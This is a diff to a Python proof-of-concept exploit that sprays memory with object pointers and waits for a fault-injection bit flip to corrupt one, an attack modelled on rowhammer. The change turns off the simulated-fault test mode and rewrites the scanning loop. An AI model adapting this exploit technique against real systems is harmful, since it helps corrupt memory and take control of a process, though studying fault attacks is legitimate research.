@@ -22,7 +22,7 @@ We can use similar strategies to rowhammer exploits, but rather than the bitflip
 occuring in memory contents "at rest", theu're occuring "in flight" over the bus.
 """
 
-TESTING = True
+TESTING = False
 
 def p64(n: int) -> bytes:
 	return n.to_bytes(8, "little")
@@ -75,18 +75,18 @@ if __name__ == "__main__":
 	magic = None
 	while not magic:
 		spray = (victim,) * 0x100_0000 # spray 128MiB worth of pointers (needs to be big enough to exceed L3 cache)
+
 		if TESTING:
 			simulate_emfi() # in practice this corrupts data "at rest", but imagine we're corrupting either the writes (during the spray) or the reads (in the loop that follows)
-	
+
 		# NB: if I can improve the performance of this loop, it'll improve the reliability of the exploit
 		# (the more memory bandwidth we use, the more likely a random fault is going to affect *our* activity,
 		# vs some other process on the system etc.)
-		for obj in spray:
-			if obj is not victim:
-				print("Found corrupted ptr!")
-				assert(type(obj) is bytearray)
-				magic = obj
-				break
+		for obj in (obj for obj in spray if obj is not victim):
+			print("Found corrupted ptr!")
+			assert(type(obj) is bytearray)
+			magic = obj
+			break
 		print(".", end="", flush=True) # progress kinda
 
 	print("\nSpray success! Corrupted victim object @", hex(id(magic)))
